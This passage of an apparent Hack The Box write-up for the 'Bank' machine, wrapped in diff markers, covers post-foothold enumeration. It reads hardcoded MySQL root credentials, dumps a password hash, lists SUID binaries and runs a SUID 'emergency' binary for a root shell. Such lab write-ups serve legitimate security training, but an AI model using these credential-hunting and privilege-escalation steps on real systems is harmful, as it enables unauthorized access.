+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">            <span class="z-keyword z-control z-php">if</span> <span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>result</span><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-other z-member z-php">num_rows</span> <span class="z-keyword z-operator z-comparison z-php">&lt;=</span> <span class="z-constant z-numeric z-integer z-decimal z-php">0</span><span class="z-punctuation z-section z-group z-end z-php">)</span></span> <span class="z-punctuation z-section z-block z-begin z-php">{</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">                <span class="z-keyword z-control z-php">return</span> <span class="z-constant z-language z-php">false</span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">            <span class="z-punctuation z-section z-block z-end z-php">}</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">            <span class="z-keyword z-control z-php">else</span> <span class="z-punctuation z-section z-block z-begin z-php">{</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">                <span class="z-keyword z-control z-php">return</span> <span class="z-constant z-language z-php">true</span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">            <span class="z-punctuation z-section z-block z-end z-php">}</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">        </span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-end z-php">}</span></span></span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php">        <span class="z-keyword z-operator z-comparison z-php">&lt;</span><span class="z-constant z-other z-php">SNIP</span><span class="z-keyword z-operator z-comparison z-php">&gt;</span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php">    </span></span><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-php">}</span></span></span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?&gt;</span><span class="z-meta z-html-newline-after-php z-php">
+</span></span></span></span></code></pre>
+<p>The <code>user.php</code> file is responsible for actually querying the MySQL database to retrieve information. It reveals that the credentials <code>root</code>:<code>!@#S3cur3P4ssw0rd!@#</code> are used to connect to the <code>htbbank</code> database! The password is apparently stored as a MD5 hash.</p>
+<p>I tried these credentials to connect to Bank as <code>root</code> using SSH, but it failed. I also tried them with <code>su -</code>, but they also failed.</p>
+<h2 id="mysql-port-3306-tcp">MySQL (port <code>3306/tcp</code>)</h2>
+<p>Let's investigate the MySQL instance running locally on Bank.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> mysql<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> root<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Enter password: !@#S3cur3P4ssw0rd!@#
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">mysql&gt;
+</span></code></pre>
+<h3 id="version">Version</h3>
+<p>Let's find out the version of MySQL in use.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SELECT @@version</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+-------------------------+
+</span><span class="z-text z-plain">| @@version               |
+</span><span class="z-text z-plain">+-------------------------+
+</span><span class="z-text z-plain">| 5.5.55-0ubuntu0.14.04.1 |
+</span><span class="z-text z-plain">+-------------------------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>So it's MySQL version <code>5.5.55</code>.</p>
+<h3 id="databases">Databases</h3>
+<p>Now, let's see which databases are available.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SHOW databases</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+--------------------+
+</span><span class="z-text z-plain">| Database           |
+</span><span class="z-text z-plain">+--------------------+
+</span><span class="z-text z-plain">| information_schema |
+</span><span class="z-text z-plain">| htbbank            |
+</span><span class="z-text z-plain">| mysql              |
+</span><span class="z-text z-plain">| performance_schema |
+</span><span class="z-text z-plain">+--------------------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>htbbank</code> database is the only interesting one, and it's also the database used by the website.</p>
+<h3 id="htbbank-s-tables"><code>htbbank</code>'s tables</h3>
+<p>Let's see which tables are included in this database.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SHOW tables</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+-------------------+
+</span><span class="z-text z-plain">| Tables_in_htbbank |
+</span><span class="z-text z-plain">+-------------------+
+</span><span class="z-text z-plain">| creditcards       |
+</span><span class="z-text z-plain">| tickets           |
+</span><span class="z-text z-plain">| users             |
+</span><span class="z-text z-plain">+-------------------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>users</code> database is probably the most interesting.</p>
+<h3 id="users-s-columns"><code>users</code>'s columns</h3>
+<p>Let's continue our enumeration of this database by checking the content of the <code>user</code> table.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SELECT column_type, column_name FROM information_schema.columns WHERE table_name = <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>users<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+--------------+-------------+
+</span><span class="z-text z-plain">| column_type  | column_name |
+</span><span class="z-text z-plain">+--------------+-------------+
+</span><span class="z-text z-plain">| int(11)      | id          |
+</span><span class="z-text z-plain">| varchar(255) | username    |
+</span><span class="z-text z-plain">| varchar(255) | email       |
+</span><span class="z-text z-plain">| varchar(255) | password    |
+</span><span class="z-text z-plain">| varchar(255) | balance     |
+</span><span class="z-text z-plain">+--------------+-------------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Okay, so this table contains five columns: <code>id</code>, <code>username</code>, <code>email</code>, <code>password</code> and <code>balance</code>.</p>
+<h3 id="users-s-columns-content"><code>users</code>'s columns content</h3>
+<p>Let's retrieve the content of the <code>username</code> and <code>password</code> columns.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SELECT username, password FROM users</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+------------------------+----------------------------------+
+</span><span class="z-text z-plain">| username               | password                         |
+</span><span class="z-text z-plain">+------------------------+----------------------------------+
+</span><span class="z-text z-plain">| Christos Christopoulos | b27179713f7bffc48b9ffd2cf9467620 |
+</span><span class="z-text z-plain">+------------------------+----------------------------------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>There's a single password, which corresponds to the one we already found.</p>
+<p>I tried these credentials to connect to Bank as <code>chris</code> using SSH, but it failed. I also tried them with <code>su chris</code>, but they also failed.</p>
+<h2 id="sudo-permissions">Sudo permissions</h2>
+<p>Let's see if we can execute anything as another user with <code>sudo</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[sudo] password for www-data:
+</span></code></pre>
+<p>We're asked for our password, but we don't know it.</p>
+<h2 id="environment-variables">Environment variables</h2>
+<p>Let's check the environment variables for our shell. Maybe we'll find something out of the ordinary?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> env</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">APACHE_PID_FILE=/var/run/apache2/apache2.pid
+</span><span class="z-text z-plain">APACHE_RUN_USER=www-data
+</span><span class="z-text z-plain">APACHE_LOG_DIR=/var/log/apache2
+</span><span class="z-text z-plain">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</span><span class="z-text z-plain">PWD=/var/www/bank
+</span><span class="z-text z-plain">APACHE_RUN_GROUP=www-data
+</span><span class="z-text z-plain">LANG=C
+</span><span class="z-text z-plain">SHLVL=1
+</span><span class="z-text z-plain">APACHE_LOCK_DIR=/var/lock/apache2
+</span><span class="z-text z-plain">APACHE_RUN_DIR=/var/run/apache2
+</span><span class="z-text z-plain">_=/usr/bin/env
+</span></code></pre>
+<p>I don't see anything out of the ordinary.</p>
+<h2 id="listening-ports">Listening ports</h2>
+<p>Let's see if any TCP local ports are listening for connections.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ss<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>tln</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">State      Recv-Q Send-Q        Local Address:Port          Peer Address:Port 
+</span><span class="z-text z-plain">LISTEN     0      10              10.10.10.29:53                       *:*     
+</span><span class="z-text z-plain">LISTEN     0      10                127.0.0.1:53                       *:*     
+</span><span class="z-text z-plain">LISTEN     0      128                       *:22                       *:*     
+</span><span class="z-text z-plain">LISTEN     0      128               127.0.0.1:953                      *:*     
+</span><span class="z-text z-plain">LISTEN     0      50                127.0.0.1:3306                     *:*     
+</span><span class="z-text z-plain">LISTEN     0      128                      :::80                      :::*     
+</span><span class="z-text z-plain">LISTEN     0      10                       :::53                      :::*     
+</span><span class="z-text z-plain">LISTEN     0      128                      :::22                      :::*     
+</span><span class="z-text z-plain">LISTEN     0      128                     ::1:953                     :::*
+</span></code></pre>
+<p>There's a few ports listening locally, including <code>53/tcp</code>, <code>953/tcp</code> and <code>3306/tcp</code>. The first one corresponds to a DNS, and the third one to the MySQL instance we explored earlier. But the second one though? What could it be?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /etc/services</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>E</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>\b953/tcp\b<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<p>There's no output, this port is unknown. Let's try to interact with it:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> nc 127.0.0.1 953</span>
+</span></code></pre>
+<p>We can enter input, and it gets echoed back. The connection closes after two attempts.</p>
+<p>Let's move on then!</p>
+<h2 id="processes">Processes</h2>
+<p>Let's use <code>pspy</code> to see which processes are running on Bank.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> /tmp/pspy</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>I don't see any cronjob.</p>
+<h2 id="suid-binaries">SUID binaries</h2>
+<p>Let's look for SUID binaries.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> find /<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>perm</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>4000</span> <span class="z-constant z-numeric z-integer z-decimal z-file-descriptor z-shell">2</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span>/dev/null</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/var/htb/bin/emergency
+</span><span class="z-text z-plain">/usr/lib/eject/dmcrypt-get-device
+</span><span class="z-text z-plain">/usr/lib/openssh/ssh-keysign
+</span><span class="z-text z-plain">/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span><span class="z-text z-plain">/usr/lib/policykit-1/polkit-agent-helper-1
+</span><span class="z-text z-plain">/usr/bin/at
+</span><span class="z-text z-plain">/usr/bin/chsh
+</span><span class="z-text z-plain">/usr/bin/passwd
+</span><span class="z-text z-plain">/usr/bin/chfn
+</span><span class="z-text z-plain">/usr/bin/pkexec
+</span><span class="z-text z-plain">/usr/bin/newgrp
+</span><span class="z-text z-plain">/usr/bin/traceroute6.iputils
+</span><span class="z-text z-plain">/usr/bin/gpasswd
+</span><span class="z-text z-plain">/usr/bin/sudo
+</span><span class="z-text z-plain">/usr/bin/mtr
+</span><span class="z-text z-plain">/usr/sbin/uuidd
+</span><span class="z-text z-plain">/usr/sbin/pppd
+</span><span class="z-text z-plain">/bin/ping
+</span><span class="z-text z-plain">/bin/ping6
+</span><span class="z-text z-plain">/bin/su
+</span><span class="z-text z-plain">/bin/fusermount
+</span><span class="z-text z-plain">/bin/mount
+</span><span class="z-text z-plain">/bin/umount
+</span></code></pre>
+<p>The <code>emergency</code> binary in <code>/var/htb/bin</code> is unusual!</p>
+<h2 id="exploring-var-htb">Exploring <code>/var/htb</code></h2>
+<p>If we explore the <code>/var/htb</code> folder, we find an <code>emergency</code> file.</p>
+<pre data-lang="py" class="language-py z-code"><code class="language-py" data-lang="py"><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span>!/usr/bin/python
+</span></span><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">os</span></span><span class="z-punctuation z-separator z-import-list z-python">,</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">sys</span></span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-meta z-function z-python"><span class="z-storage z-type z-function z-python"><span class="z-keyword z-declaration z-function z-python">def</span></span> <span class="z-entity z-name z-function z-python"><span class="z-meta z-generic-name z-python">close</span></span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-begin z-python">(</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-end z-python">)</span></span><span class="z-meta z-function z-python"><span class="z-punctuation z-section z-function z-begin z-python">:</span></span>
+</span><span class="z-source z-python">    <span class="z-keyword z-other z-print z-python">print</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">Bye<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
+</span><span class="z-source z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">sys</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">exit</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-meta z-function z-python"><span class="z-storage z-type z-function z-python"><span class="z-keyword z-declaration z-function z-python">def</span></span> <span class="z-entity z-name z-function z-python"><span class="z-meta z-generic-name z-python">getroot</span></span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-begin z-python">(</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-end z-python">)</span></span><span class="z-meta z-function z-python"><span class="z-punctuation z-section z-function z-begin z-python">:</span></span>
+</span><span class="z-source z-python">    <span class="z-meta z-statement z-exception z-try z-python"><span class="z-keyword z-control z-exception z-try z-python">try</span><span class="z-punctuation z-section z-block z-exception z-try z-python">:</span></span>
+</span><span class="z-source z-python">        <span class="z-keyword z-other z-print z-python">print</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">Popping up root shell..<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-terminator z-statement z-python">;</span>
+</span><span class="z-source z-python">        <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">os</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">system</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">/var/htb/bin/emergency<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">        <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">close</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">    <span class="z-meta z-statement z-exception z-catch z-python"><span class="z-keyword z-control z-exception z-catch z-python">except</span><span class="z-punctuation z-section z-block z-exception z-catch z-python">:</span></span>
+</span><span class="z-source z-python">        <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">sys</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">exit</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">q1</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">raw_input</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">[!] Do you want to get a root shell? (THIS SCRIPT IS FOR EMERGENCY ONLY) [y/n]: <span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-terminator z-statement z-python">;</span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-meta z-statement z-conditional z-if z-python"><span class="z-keyword z-control z-conditional z-if z-python">if</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">q1</span></span> <span class="z-keyword z-operator z-comparison z-python">==</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">y<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-python">or</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">q1</span></span> <span class="z-keyword z-operator z-comparison z-python">==</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">yes<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-block z-conditional z-if z-python">:</span></span>
+</span><span class="z-source z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">getroot</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python"><span class="z-meta z-statement z-conditional z-else z-python"><span class="z-keyword z-control z-conditional z-else z-python">else</span><span class="z-punctuation z-section z-block z-conditional z-else z-python">:</span></span>
+</span><span class="z-source z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">close</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span></code></pre>
+<p>Okay, so this Python script executes the <code>emergency</code> binary in <code>/var/htb/bin</code>, which we know has the SUID bit set. It probably gives us a root shell!</p>
+<h1 id="privilege-escalation-var-htb-emergency">Privilege escalation (<code>/var/htb/emergency</code>)</h1>
+<p>Let's execute it:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> /var/htb/emergency</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[!] Do you want to get a root shell? (THIS SCRIPT IS FOR EMERGENCY ONLY) [y/n]:
+</span></code></pre>
+<p>Let's enter <code>y</code>:</p>
+<pre class="z-code"><code><span class="z-text z-plain">[!] Do you want to get a root shell? (THIS SCRIPT IS FOR EMERGENCY ONLY) [y/n]: y
+</span><span class="z-text z-plain">Popping up root shell..
+</span><span class="z-text z-plain">#
+</span></code></pre>
+<p>If we run <code>whoami</code>, we see that we are <code>root</code>!</p>
+<p>Our shell is not really interactive, but I didn't manage to get a better shell.</p>
+<h1 id="local-enumeration-1">Local enumeration</h1>
+<h2 id="home-folder-1">Home folder</h2>
+<p>The only thing we need to do to finish this box is to retrieve the root flag!</p>
+<p>As usual, we can find it in our home folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> cat /root/root.txt</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">45d878f3ef6ef5dca2d000b354a27df6
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bank/success.png" alt="Success" /></p>
+<p>That's it for this box! The foothold was fairly easy to identify and obtain. The privilege escalation was also really classic, it just required a thorough enumeration to find the <code>emergency</code> script and binary. </p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
